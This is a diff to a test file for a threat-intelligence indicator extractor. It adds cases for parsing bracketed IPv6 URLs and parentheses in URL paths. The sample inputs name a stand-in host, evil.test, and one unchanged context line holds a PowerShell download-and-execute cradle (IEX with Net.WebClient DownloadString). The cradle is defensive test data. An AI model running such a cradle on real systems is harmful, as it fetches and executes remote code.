@@ -284,6 +284,21 @@ describe("IOC hygiene — identifiers named inside a script block", () => {
 
   // The URL pass must answer the same way, or the two spellings of one destination diverge again —
   // which is the whole complaint #744 was filed about.
+  // The importers' URL pattern used to refuse "]" outright, so an IPv6 authority was cut at the
+  // bracket and the port and path were lost with it — a broken indicator, and a different one from
+  // what the deobfuscator produced for the same URL.
+  it("reads a whole IPv6 URL, bracket, port and path", () => {
+    expect(values("beacon to http://[2001:db8::1]:8080/x")).toContain("http://[2001:db8::1]:8080/x");
+    expect(values("beacon to http://[2001:db8::1]")).toContain("http://[2001:db8::1]");
+  });
+
+  it("keeps balanced parentheses in a URL path, and drops the sentence's own", () => {
+    expect(values("staged at http://evil.test/a(foo)")).toContain("http://evil.test/a(foo)");
+    const v = values("(grab it from http://evil.test/a)");
+    expect(v).toContain("http://evil.test/a");
+    expect(v).not.toContain("http://evil.test/a)");
+  });
+
   it("applies the same quote rule to the URL pass", () => {
     const quoted = values("IEX (New-Object Net.WebClient).DownloadString('http://evil.test/a.')");
     expect(quoted).toContain("http://evil.test/a.");
